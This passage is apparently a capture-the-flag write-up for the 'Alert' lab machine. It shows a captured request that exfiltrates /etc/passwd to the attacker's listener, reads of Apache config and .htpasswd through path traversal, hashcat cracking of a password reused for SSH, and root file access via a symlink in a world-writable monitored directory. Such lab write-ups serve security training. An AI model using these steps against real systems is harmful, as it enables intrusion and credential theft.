GET /log.php?content=%3Cpre%3Eroot%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fbash%0Adaemon%3Ax%3A1%3A1%3Adaemon%3A%2Fusr%2Fsbin%3A%2Fusr%2Fsbin%2Fnologin%0Abin%3Ax%3A2%3A2%3Abin%3A%2Fbin%3A%2Fusr%2Fsbin%2Fnologin%0Asys%3Ax%3A3%3A3%3Asys%3A%2Fdev%3A%2Fusr%2Fsbin%2Fnologin%0Async%3Ax%3A4%3A65534%3Async%3A%2Fbin%3A%2Fbin%2Fsync%0Agames%3Ax%3A5%3A60%3Agames%3A%2Fusr%2Fgames%3A%2Fusr%2Fsbin%2Fnologin%0Aman%3Ax%3A6%3A12%3Aman%3A%2Fvar%2Fcache%2Fman%3A%2Fusr%2Fsbin%2Fnologin%0Alp%3Ax%3A7%3A7%3Alp%3A%2Fvar%2Fspool%2Flpd%3A%2Fusr%2Fsbin%2Fnologin%0Amail%3Ax%3A8%3A8%3Amail%3A%2Fvar%2Fmail%3A%2Fusr%2Fsbin%2Fnologin%0Anews%3Ax%3A9%3A9%3Anews%3A%2Fvar%2Fspool%2Fnews%3A%2Fusr%2Fsbin%2Fnologin%0Auucp%3Ax%3A10%3A10%3Auucp%3A%2Fvar%2Fspool%2Fuucp%3A%2Fusr%2Fsbin%2Fnologin%0Aproxy%3Ax%3A13%3A13%3Aproxy%3A%2Fbin%3A%2Fusr%2Fsbin%2Fnologin%0Awww-data%3Ax%3A33%3A33%3Awww-data%3A%2Fvar%2Fwww%3A%2Fusr%2Fsbin%2Fnologin%0Abackup%3Ax%3A34%3A34%3Abackup%3A%2Fvar%2Fbackups%3A%2Fusr%2Fsbin%2Fnologin%0Alist%3Ax%3A38%3A38%3AMailing%20List%20Manager%3A%2Fvar%2Flist%3A%2Fusr%2Fsbin%2Fnologin%0Airc%3Ax%3A39%3A39%3Aircd%3A%2Fvar%2Frun%2Fircd%3A%2Fusr%2Fsbin%2Fnologin%0Agnats%3Ax%3A41%3A41%3AGnats%20Bug-Reporting%20System%20(admin)%3A%2Fvar%2Flib%2Fgnats%3A%2Fusr%2Fsbin%2Fnologin%0Anobody%3Ax%3A65534%3A65534%3Anobody%3A%2Fnonexistent%3A%2Fusr%2Fsbin%2Fnologin%0Asystemd-network%3Ax%3A100%3A102%3Asystemd%20Network%20Management%2C%2C%2C%3A%2Frun%2Fsystemd%3A%2Fusr%2Fsbin%2Fnologin%0Asystemd-resolve%3Ax%3A101%3A103%3Asystemd%20Resolver%2C%2C%2C%3A%2Frun%2Fsystemd%3A%2Fusr%2Fsbin%2Fnologin%0Asystemd-timesync%3Ax%3A102%3A104%3Asystemd%20Time%20Synchronization%2C%2C%2C%3A%2Frun%2Fsystemd%3A%2Fusr%2Fsbin%2Fnologin%0Amessagebus%3Ax%3A103%3A106%3A%3A%2Fnonexistent%3A%2Fusr%2Fsbin%2Fnologin%0Asyslog%3Ax%3A104%3A110%3A%3A%2Fhome%2Fsyslog%3A%2Fusr%2Fsbin%2Fnologin%0A_apt%3Ax%3A105%3A65534%3A%3A%2Fnonexistent%3A%2Fusr%2Fsbin%2Fnologin%0Atss%3Ax%3A106%3A111%3ATPM%20software%20stack%2C%2C%2C%3A%2Fvar%2Flib%2Ftpm%3A%2Fbin%2Ffalse%0Auuidd%3Ax%3A107%3A112%3A%3A%2Frun%2Fuuidd%3A%2Fusr%2Fsbin%2Fnologin%0Atcpdump%3Ax%3A108%3A113%3A%3A%2Fnonexistent%3A%2Fusr%2Fsbin%2Fnologin%0Alandscape%3Ax%3A109%3A115%3A%3A%2Fvar%2Flib%2Flandscape%3A%2Fusr%2Fsbin%2Fnologin%0Apollinate%3Ax%3A110%3A1%3A%3A%2Fvar%2Fcache%2Fpollinate%3A%2Fbin%2Ffalse%0Afwupd-refresh%3Ax%3A111%3A116%3Afwupd-refresh%20user%2C%2C%2C%3A%2Frun%2Fsystemd%3A%2Fusr%2Fsbin%2Fnologin%0Ausbmux%3Ax%3A112%3A46%3Ausbmux%20daemon%2C%2C%2C%3A%2Fvar%2Flib%2Fusbmux%3A%2Fusr%2Fsbin%2Fnologin%0Asshd%3Ax%3A113%3A65534%3A%3A%2Frun%2Fsshd%3A%2Fusr%2Fsbin%2Fnologin%0Asystemd-coredump%3Ax%3A999%3A999%3Asystemd%20Core%20Dumper%3A%2F%3A%2Fusr%2Fsbin%2Fnologin%0Aalbert%3Ax%3A1000%3A1000%3Aalbert%3A%2Fhome%2Falbert%3A%2Fbin%2Fbash%0Alxd%3Ax%3A998%3A100%3A%3A%2Fvar%2Fsnap%2Flxd%2Fcommon%2Flxd%3A%2Fbin%2Ffalse%0Adavid%3Ax%3A1001%3A1002%3A%2C%2C%2C%3A%2Fhome%2Fdavid%3A%2Fbin%2Fbash%0A%3C%2Fpre%3E%0A HTTP/1.1
Host: 10.10.16.14:4441
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
Accept: */*
Origin: http://alert.htb
Referer: http://alert.htb/
Accept-Encoding: gzip, deflate
```

After using the decoding script and hosting it on the python http server, the contents are readable.

## /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
albert:x:1000:1000:albert:/home/albert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
david:x:1001:1002:,,,:/home/david:/bin/bash
```

The only interesting entries are the ones allowed a shell

```bash
$ cat pages/etc_passwd.html | rg "/bin/bash" 
<pre>root:x:0:0:root:/root:/bin/bash
albert:x:1000:1000:albert:/home/albert:/bin/bash
david:x:1001:1002:,,,:/home/david:/bin/bash
```

So three users

- `root`
- `albert`
- `david`.

The strategy after this is to attempt to get

- `/home/albert/user.txt`
- `/home/david/user.txt`
- `../../../../../../etc/shadow`

but that didn't seem to work. 
Another candidate is `../../../../etc/hosts`.

## /etc/hosts

The contents yield a subdomain `statistics.alert.htb` which is added to `/etc/hosts` on the attacker.

```
10.10.11.44 statistics.alert.htb
```

## statistics.alert.htb

When browsing the site an authentication window appears.  

Here immediately a thought is born to either inspect the traffic to see if the credentials can be captured since it's http, or if a bogus page can be created and used to trick the user to make them send us the credentials via the XSS.

Inspecting what is sent to the server via the debug console shows an interesting header:

## HTTP Request headers

  
We see that the header `Authorization` contains  
`Basic YXNkZmFzZDphc2RmZmRhc2Zk` which looked a lot like something familiar.

```
$ echo "dGVzdDp0ZXN0" | base64 -d
test:test
```

Sure enough, it is base64.  

In the end this did not prove fruitful as a proxy didn't work as intended and neither did attempting to capture the credentials. But since it is known it is an **apache** server (from errors and previous requests), some known default config files are:
- /etc/httpd/conf/httpd.conf
- /etc/apache2/apache2.conf
- /etc/apache2/sites-available/000-default.conf

The third in the list worked, and provided the following information:

```

    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    
        Options FollowSymLinks MultiViews
        AllowOverride All
    

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    
        Options FollowSymLinks MultiViews
        AllowOverride All
    

    
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
```

Here it's possible to see the path to the **AuthUserFile**, i.e  **/var/www/statistics.alert.htb/.htpasswd**. So yet again the payload is modified, uploaded, shared, captured and decoded.

## /var/www/statistics.alert.htb/.htpasswd
The file contains
```
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

Now all that was needed was to use **hashcat** to crack the password.
```
$ hashcat hashes.txt rockyou.txt --user
[output omitted]

$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited    
```

Successfully retrieved the password "manchesterunited". A great idea here is to check if it happens to also be the ssh password.
```
➜  alert ssh albert@10.10.11.44
albert@10.10.11.44's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 23 Feb 2025 06:53:09 AM UTC

  System load:  0.0               Processes:             245
  Usage of /:   62.9% of 5.03GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.10.11.44
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 19 14:19:09 2024 from 10.10.14.23
albert@alert:~$ 
albert@alert:~$ cat user.txt
[output omitted]
```

Just like that, the user flag was retrieved.

## Poking around with albert
Some recon is done to establish permissions
```
albert@alert:/$ sudo -l
[sudo] password for albert: 
Sorry, user albert may not run sudo on alert.
albert@alert:/$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

Okay, 1001 management looks interesting and naturally one has to see what files allow management to do stuff.

```
albert@alert:/$ find / -group management -ls 2>/dev/null
     8299      4 drwxrwxr-x   2 root     management     4096 Oct 12 04:17 /opt/website-monitor/config
     3785      4 -rwxrwxr-x   1 root     management       49 Nov  5 14:31 /opt/website-monitor/config/configuration.php
```

For the directory `/opt/website-monitor/config` and the file `/opt/website-monitor/config/configuration.php` the group has read, write and execute permissions. Great place to start. But it's also interesting to know what local ports are running.

```
albert@alert:/opt/website-monitor/config$ ss -ltpn
State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                  Process                  
LISTEN                   0                        4096                                           127.0.0.1:8080                                          0.0.0.0:*                                              
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                            0.0.0.0:*                                              
LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*                                              
LISTEN                   0                        511                                                    *:80                                                  *:*                                              
LISTEN                   0                        128                                                 [::]:22                                               [::]:*                          
```

There is TCP port 8080 that seems to be running something, and that something runs as `root`. SSH can be used to create a reverse ssh tunnel in order to be able to browse potential http content.

The following is run on the attacker (local port 9999 in this case, but anything can be chosen)
```
alert ssh -L 9999:127.0.0.1:8080 albert@10.10.11.44
```

which allows the attacker to visit the page.

As mentioned, this thing runs as root. Usually a bad idea.

Since the application seemed to stem from **/opt/website-monitor/** another great idea is to check what files and permissions it has:
```
albert@alert:/opt/website-monitor$ ll
total 96
drwxrwxr-x 7 root root        4096 Oct 12 01:07 ./
drwxr-xr-x 4 root root        4096 Oct 12 00:58 ../
drwxrwxr-x 2 root management  4096 Feb 23 07:51 config/
drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git/
drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents/
-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php*
-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE*
-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php*
drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors/
-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json*
-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php*
-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md*
-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css*
drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates/
```

## /opt/website-monitor/monitors
The directory looks interesting because it has read, write and execute permissions for everyone, and was owned by root. 

```
albert@alert:/opt/website-monitor$ ls monitors
alert.htb  statistics.alert.htb
```

The files are also browsable by the **Website Monitor** webapp.

Cool. The question is, what would happen if we did something sneaky, considering we have `rwx` permissions in the folder these files are contained?

Let's find out. First we create a symlink for for our `root.txt`.
```
albert@alert:/opt/website-monitor/monitors$ ln -s /root/root.txt flag.txt
albert@alert:/opt/website-monitor/monitors$ ls
alert.htb  flag.txt  statistics.alert.htb
```

Then we browse it:

(Again, output omitted) 

All flags obtained. ✅ Mission successfully completed. ✅
# An exercise
Even though all flags have already been obtained, it's always fun to attempt to get a root shell.  

We already know we can get root accessible files, so what about `/etc/shadow`?

Yes, great. We can see the root password hash. One entrypoint is to attempt to crack this one.

Another entrypoint might be to poke around the writable `/opt/website-monitor/config/configuration.php` and in general the `/opt/website-monitor/config/configuration.php` directory. 

Hint:
Using `git diff` inside the `/opt/website-monitor/` directory is useful.
